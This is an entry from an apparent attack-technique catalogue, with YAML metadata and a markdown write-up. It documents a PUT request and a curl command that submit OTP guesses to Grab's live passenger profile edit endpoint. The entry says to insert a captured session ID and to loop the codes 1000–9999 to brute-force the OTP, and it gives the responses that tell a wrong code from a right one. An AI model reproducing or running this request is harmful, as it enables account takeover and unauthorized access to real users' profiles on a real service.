---
id: g7h8i9j0-k1l2-3456-ghij-789012345678
data: |-
  PUT /api/passenger/v2/profiles/edit HTTP/1.1
  Content-Type: application/x-www-form-urlencoded
  x-mts-ssid: [SESSION_ID]
  x-request-id: 3b609418-0e40-4f86-8ff6-4f23dfac420f
  Host: p.grabtaxi.com
  Content-Length: 26
  Accept-Encoding: gzip
  Connection: Keep-Alive

  profileActivationCode=3122
tags:
  - api
  - brute-force
type: command
output: 'HTTP/1.1 400 Bad Request with body {"status":400,"code":4000}'
executor: http
platforms:
  - Web API
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:31:42.908Z'
verified: false
validated: true
submitted: true
---
# Put-Profile-Edit-OTP

## Command

```http
PUT /api/passenger/v2/profiles/edit HTTP/1.1
Content-Type: application/x-www-form-urlencoded
x-mts-ssid: [SESSION_ID]
x-request-id: 3b609418-0e40-4f86-8ff6-4f23dfac420f
Host: p.grabtaxi.com
Content-Length: 26
Accept-Encoding: gzip
Connection: Keep-Alive

profileActivationCode=3122
```

## Description

Sends a PUT request to the Grab profile edit endpoint with an OTP code attempt, used in brute-force to test codes. Replace [SESSION_ID] with captured x-mts-ssid.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| x-mts-ssid | Session authentication header | Yes |
| x-request-id | Unique request UUID | Yes |
| profileActivationCode | 4-digit OTP to test | Yes |

## Examples

### Basic Usage

Use curl equivalent:

```bash
curl -X PUT "https://p.grabtaxi.com/api/passenger/v2/profiles/edit" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "x-mts-ssid: [SESSION_ID]" \
  -H "x-request-id: 3b609418-0e40-4f86-8ff6-4f23dfac420f" \
  -d "profileActivationCode=3122"
```

### Advanced Usage

Loop in script for brute-force, varying profileActivationCode from 1000 to 9999.

## Expected Output

For incorrect code: HTTP/1.1 400 Bad Request {"status":400,"code":4000}. For correct: 204 No Content.

## Related

- [[procedures/Brute-Force-OTP-with-Custom-Tool]]
